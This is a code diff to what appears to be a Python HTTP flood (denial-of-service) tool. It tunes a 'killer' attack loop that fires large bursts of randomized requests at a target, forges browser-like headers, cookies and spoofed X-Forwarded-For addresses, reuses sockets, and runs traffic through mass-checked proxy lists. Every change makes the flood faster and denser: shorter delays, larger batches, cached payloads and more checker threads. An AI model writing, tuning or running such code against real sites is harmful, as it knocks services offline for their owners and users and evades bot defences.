@@ -2295,7 +2295,7 @@ class _AdaptiveBurstController:
         self.max_workers = initial_workers
         self.success_count = 0
         self.fail_count = 0
-        self.window_size = 500
+        self.window_size = 100
 
     def record_success(self):
         self.success_count += 1
@@ -2311,9 +2311,9 @@ class _AdaptiveBurstController:
             return
         rate = self.success_count / total if total > 0 else 0
         if rate > 0.95:
-            self.current_workers = min(self.current_workers + 5, self.max_workers)
+            self.current_workers = min(self.current_workers + 10, self.max_workers)
         elif rate < 0.80:
-            self.current_workers = max(self.current_workers - 10, 20)
+            self.current_workers = max(self.current_workers - 5, 20)
         self.success_count = 0
         self.fail_count = 0
 
@@ -2553,21 +2553,25 @@ def _killer_process_entry(max_workers, rpc,
                 continue
 
     def get_connection():
-        with pool_lock:
-            while conn_pool:
-                s = conn_pool.pop()
-                if hasattr(s, 'impersonate'):
-                    return s
+        while True:
+            s = None
+            with pool_lock:
+                if conn_pool:
+                    s = conn_pool.pop()
+            if s is None:
+                break
+            if hasattr(s, 'impersonate'):
+                return s
+            try:
+                s.setblocking(False)
+                s.recv(0, 0x400 | 0x40)
+                s.setblocking(True)
+                return s
+            except (BlockingIOError, OSError):
                 try:
-                    s.setblocking(False)
-                    s.recv(0, 0x400 | 0x40)
-                    s.setblocking(True)
-                    return s
-                except (BlockingIOError, OSError):
-                    try:
-                        s.close()
-                    except Exception:
-                        pass
+                    s.close()
+                except Exception:
+                    pass
         try:
             return _open_conn()
         except Exception:
@@ -2577,6 +2581,13 @@ def _killer_process_entry(max_workers, rpc,
         if s is None:
             return
         if hasattr(s, 'impersonate'):
+            age = getattr(s, '_killer_age', 0) + 1
+            s._killer_age = age
+            if age < 80:
+                with pool_lock:
+                    if len(conn_pool) < max_workers:
+                        conn_pool.append(s)
+                        return
             try:
                 s.close()
             except Exception:
@@ -2650,14 +2661,13 @@ def _killer_process_entry(max_workers, rpc,
                             burst_ctrl.record_failure()
                             break
                         burst_ctrl.record_success()
-                    sleep(uniform(0.001, 0.005))
+                    sleep(0.0001)
             else:
-                batch = min(rpc, randint(15, 40))
+                batch = min(rpc, randint(50, 150))
                 for _ in range(batch):
-                    method = rc(("GET", "GET", "GET", "POST", "HEAD"))
-                    rand_path = _killer_rand_path_fast(_KILLER_PATHS_STANDALONE)
-
                     if is_curl:
+                        method = rc(("GET", "GET", "GET", "POST", "HEAD"))
+                        rand_path = _killer_rand_path_fast(_KILLER_PATHS_STANDALONE)
                         url = "%s://%s%s" % (target_scheme, target_authority, rand_path)
                         try:
                             s.request(method, url, timeout=9, allow_redirects=False)
@@ -2666,59 +2676,12 @@ def _killer_process_entry(max_workers, rpc,
                             burst_ctrl.record_failure()
                             break
                     else:
-                        cookie = ks.get_cookie_header()
-                        spoof = PT.Random.rand_ipv4()
-
-                        parts = [
-                            "%s %s HTTP/1.1\r\n" % (method, rand_path),
-                            "Host: %s\r\n" % target_authority,
-                            "User-Agent: %s\r\n" % fp["ua_prefix"],
-                            "Accept: %s\r\n" % rc(fp["accept"]),
-                            "Accept-Language: %s\r\n" % rc(fp["languages"]),
-                            "Accept-Encoding: %s\r\n" % rc((
-                                "gzip, deflate, br, zstd",
-                                "gzip, deflate, br",
-                                "gzip, deflate")),
-                            "X-Forwarded-For: %s\r\n" % spoof,
-                        ]
-                        if fp.get("sec_ch_ua"):
-                            parts.append('Sec-CH-UA: %s\r\n' % fp["sec_ch_ua"])
-                            parts.append('Sec-CH-UA-Mobile: ?0\r\n')
-                            parts.append('Sec-CH-UA-Platform: %s\r\n' % fp["platform"])
-                        if cookie:
-                            parts.append("Cookie: %s\r\n" % cookie)
-                        if rc([True, False]):
-                            parts.append("DNT: 1\r\n")
-                        if rc([True, False]):
-                            parts.append("Cache-Control: %s\r\n" % rc(("no-cache", "no-store")))
-                        if rc([True, False]):
-                            parts.append("Connection: keep-alive\r\n")
-                        if rc([True, True, False]):
-                            parts.append("Sec-Fetch-Dest: %s\r\n" % rc(("document", "empty", "script")))
-                            parts.append("Sec-Fetch-Mode: %s\r\n" % rc(("navigate", "cors")))
-                            parts.append("Sec-Fetch-Site: %s\r\n" % rc(("none", "same-origin")))
-                            parts.append("Sec-Fetch-User: ?1\r\n")
-                        if rc([True, False]):
-                            parts.append("Upgrade-Insecure-Requests: 1\r\n")
-                        if rc([True, False, False, False]):
-                            parts.append("Referer: %s\r\n" % _killer_build_referrer(target_authority))
-                        if fp.get("device_memory") and rc([True, False, False, False, False]):
-                            parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
-                        if rc([True, False, False, False, False, False, False, False, False]):
-                            parts.append("Priority: %s\r\n" % rc(("u=0, i", "u=1, i")))
-                        parts.append("\r\n")
-                        if method == "POST":
-                            rand_data = PT.Random.rand_str(randint(32, 128))
-                            parts.insert(-1, "Content-Type: application/json\r\n")
-                            parts.insert(-1, "Content-Length: %d\r\n" % (len(rand_data) + 16))
-                            parts.append('{"data":"%s"}' % rand_data)
-
-                        payload = str.encode("".join(parts))
+                        payload = rc(_payload_cache)
                         if not Tools.send(s, payload):
                             burst_ctrl.record_failure()
                             break
                         burst_ctrl.record_success()
-                    sleep(uniform(0.0001, 0.001))
+                    sleep(0.00005)
 
             if not is_curl:
                 return_conn(s)
@@ -2738,6 +2701,13 @@ def _killer_process_entry(max_workers, rpc,
     session_cache = {}
     base_delay = max(0.0005, 1.0 / max(max_workers, 1))
 
+    _payload_cache = []
+    for _ in range(min(max_workers, 50)):
+        _payload_cache.append(_killer_build_request_standalone(
+            rc(("GET", "GET", "GET", "POST", "HEAD")),
+            _killer_rand_path_fast(_KILLER_PATHS_STANDALONE),
+            rc(fp_list), target_authority, ref_list, cached_target_path))
+
     with ThreadPoolExecutor(max_workers=max_workers) as pool:
         while active:
             refill_pool()
@@ -2745,11 +2715,11 @@ def _killer_process_entry(max_workers, rpc,
             for _ in range(burst):
                 pool.submit(_worker, get_connection, return_connection,
                             rpc, burst_ctrl, session_cache)
-            sleep(base_delay * uniform(0.05, 0.2))
+            sleep(base_delay * uniform(0.01, 0.05))
             for _ in range(max(burst // 2, 5)):
                 pool.submit(_worker, get_connection, return_connection,
                             rpc, burst_ctrl, session_cache)
-            sleep(base_delay * uniform(0.1, 0.5))
+            sleep(base_delay * uniform(0.02, 0.1))
             if len(session_cache) > max_workers * 2:
                 session_cache.clear()
 
@@ -3399,17 +3369,16 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
 
     logger.info(
         f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies downloaded, checking...{bcolors.RESET}!")
-    if len(Proxies) > 50000:
+    if len(Proxies) > 10000:
         from random import sample
-        Proxies = set(sample(list(Proxies), 50000))
+        Proxies = set(sample(list(Proxies), 10000))
         logger.info(
-            f"{bcolors.WARNING}Capped to {bcolors.OKBLUE}50,000{bcolors.WARNING} random proxies for faster checking{bcolors.RESET}")
-    check_threads = min(max(threads, 500), len(Proxies))
+            f"{bcolors.WARNING}Capped to {bcolors.OKBLUE}10,000{bcolors.WARNING} random proxies for faster checking{bcolors.RESET}")
+    check_threads = min(max(threads, 1000), len(Proxies))
     Proxies = ProxyChecker.checkAll(
-        Proxies, timeout=5, threads=check_threads,
+        Proxies, timeout=3, threads=check_threads,
         url=url.human_repr() if url else "http://httpbin.org/get",
     )
-    Proxies = checked
 
     if not Proxies:
         logger.warning(f"{bcolors.WARNING}All proxies failed check, falling back to file{bcolors.RESET}")
